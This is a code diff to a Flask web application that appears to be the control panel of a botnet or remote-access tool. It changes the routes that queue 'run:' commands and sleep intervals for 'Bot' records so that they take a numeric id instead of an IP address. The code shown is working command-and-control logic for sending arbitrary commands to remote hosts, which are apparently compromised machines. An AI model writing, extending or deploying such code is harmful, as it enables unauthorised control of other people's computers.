@@ -51,21 +51,22 @@ def api_clients_list():
         data[bot.id]["set_interval"] = bot.sleep_interval
     return json.dumps(data)
 
-@app.route("/api/clients/cmd", methods=["POST"])
+@app.route("/api/clients/cmd/<int:id>", methods=["POST"])
 @login_required
-def api_clients_cmd():
+def api_clients_cmd(id):
     data = json.loads(request.get_data())
-    g.queue[data['IP']].append("run:"+data['cmd'])
+    bot = Bot.query.filter_by(id=id).one()
+    g.queue[bot.ip].append("run:"+data['cmd'])
     return "", 200
 
-@app.route("/api/clients/sleep", methods=["POST"])
+@app.route("/api/clients/sleep/<int:id>", methods=["POST"])
 @login_required
-def api_clients_sleep():
+def api_clients_sleep(id):
     data = json.loads(request.get_data())
     try: int(data['interval'])
     except: return "", 500
-    g.queue[data['IP']].append("set sleep:"+data['interval'])
-    bot = Bot.query.filter_by(ip=data['IP']).one()
+    bot = Bot.query.filter_by(id=id).one()
+    g.queue[bot.ip].append("set sleep:"+data['interval'])
     bot.sleep_interval = data['interval']
     db.session.add(bot)
     db.session.commit()
